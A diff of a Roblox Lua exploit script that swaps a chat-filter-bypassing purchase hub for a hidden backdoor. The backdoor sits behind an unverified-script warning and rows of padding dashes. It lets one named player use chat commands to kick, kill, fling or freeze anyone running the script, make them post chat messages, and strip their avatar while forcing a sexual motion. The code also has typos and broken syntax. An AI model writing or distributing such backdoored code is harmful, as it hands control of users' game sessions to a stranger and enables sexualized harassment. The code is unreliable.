@@ -1,45 +1,364 @@
-local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua'))()
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+--// Premium User //--
+local user_premium__001 = game.Players.ProAIt5000
 
-local Window = Rayfield:CreateWindow({
-   Name = "Jann Hub",
-   LoadingTitle = "Loading Jann Hub",
-   LoadingSubtitle = "by Jack & Ven | .gg/pams",
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = nil, -- Create a custom folder for your hub/game
-      FileName = "Jann Hub"
-   },
-   Discord = {
-      Enabled = false,
-      Invite = "pams", -- The Discord invite code, do not include discord.gg/
-      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
-   },
-   KeySystem = true, -- Set this to true to use our key system
-   KeySettings = {
-      Title = "Jann Hub",
-      Subtitle = "Key System",
-      Note = "Join the discord (discord.gg/pams)",
-      FileName = "VennKey",
-      SaveKey = true,
-      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-      Key = "ilovemen231"
-   }
-})
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
 
-local Tab = Window:CreateTab("Modifications", 16451926444) -- Title, Image
+--// Premium Commands //--
+local freeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
+end
 
-local Input = Tab:CreateInput({
-   Name = "Buy Character",
-   Info = "Enter the text of the character you would like to purchase, it doesnt have to be a real character. Bypasses chat filter.", -- Speaks for itself, Remove if none.
-   PlaceholderText = "Input Text",
-   OnEnter = true, -- Will callback only if the user pressed ENTER while the box is focused.
-   RemoveTextAfterFocusLost = false,
-   Callback = function(Text)
-local args = {
+local unfreeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
+end
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":kick .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer:Kick("Kicked by Premium user")
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":comeback .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			local args = {
     [1] = "Character",
-    [2] = Text
+    [2] = math.random(1, 23523532523532532)
 }
 
 game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Buy"):FireServer(unpack(args))
-   end,
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":statue .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			   for i,v in pairs (workspace.Idols:GetDescendants()) do
+                if v.Name == "Bag" then
+                    v.hit.Transparency = 1
+                    v.hit.CanCollide = false
+                    wait()
+                    v.hit.Position = game.Players.LocalPlayer.Character.Torso.Position
+                    task.wait()
+                    v:Destroy()
+                    wait()
+                elseif v.Name == "SafetyStatue" then
+                    v.hit.Transparency = 1
+                    v.hit.CanCollide = false
+                    wait()
+                    v.hit.Position = game.Players.LocalPlayer.Character.Torso.Position
+                    wait()
+                end
+            end
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":win .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+local v = game.Workspace:FindFirstChild("Finish")
+                    v.CanCollide = false
+                    v.Transparency = 1
+                    wait()
+                    v.Position = game.Players.LocalPlayer.Character.Torso.Position
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":expose .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			local A_1 = "Btw how are you guys lol" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":talk") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			local A_1 = string.sub(cht, 6, 99999) local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":fling .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+			power = 99999999 -- change this to make it more or less powerful
+ 
+			game:GetService('RunService').Stepped:connect(function()
+			game.Players.LocalPlayer.Character.Head.CanCollide = false
+			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+			end)
+			wait(.1)
+			local bambam = Instance.new("BodyThrust")
+			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+			bambam.Force = Vector3.new(power,0,power)
+			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":benx .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			wait(0) local A_1 = "Yeah Yeah!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = user_premium__001.Character.HumanoidRootPart
+			local benxed = true
+			while benxed == true do
+				hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+				pcall(function()
+    					hummy.Parent.Pants:Destroy()
+				end)
+				pcall(function()
+    					hummy.Parent.Shirt:Destroy()
+				end)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = user_premium__001.Character.HumanoidRootPart.CFrame + user_premium__001.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+				wait(0.1)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+			end
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":unbenx .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			benxPos = player.Character.HumanoidRootPart.CFrame
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+			wait(7)
+			player.Character.HumanoidRootPart.CFrame = benxPos
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":freeze .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			freeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":unfreeze .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			unfreeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":thaw .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			unfreeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":ban .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer:kick("PERMA BAN")
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":kill .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.Humanoid.Health = 0
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":premcmds") then
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":void .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":bring .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.HumanoidRootPart.Position)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":grave .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":ungrave .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":grave me") then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":ungrave me") then
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":kick me") then
+		if game.Players.LocalPlayer == user_premium__001 then
+			game.Players.LocalPlayer:Kick("Kicked yourself")
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":freeze me") then
+		if game.Players.LocalPlayer == user_premium__001 then
+			freeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":unfreeze me") then
+		if game.Players.LocalPlayer == user_premium__001 then
+			unfreeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":thaw me") then
+		if game.Players.LocalPlayer == user_premium__001 then
+			unfreeze()
+		end
+	end
+
+end)
+
+---------------------------------------------------------------------
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":cmds") then
+		if game.Players.LocalPlayer == user_premium__001 then
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "Cmds:";
+	Text = ":Freeze :grave :benx :bring :void :kill :kick :ban :fling";
+	Time = 50;
+	Icon = "rbxassetid://505845268";
 })
+		end
+	end
+
+end)
+---------------------
+
+if game.Players.LocalPlayer == user_premium__001 then
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "Premium Loaded";
+	Text = "";
+	Time = 10;
+	Icon = "rbxassetid://505845268";
+})
+else
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "No Premium!";
+	Text = "D:";
+	Time = 10;
+})
+end
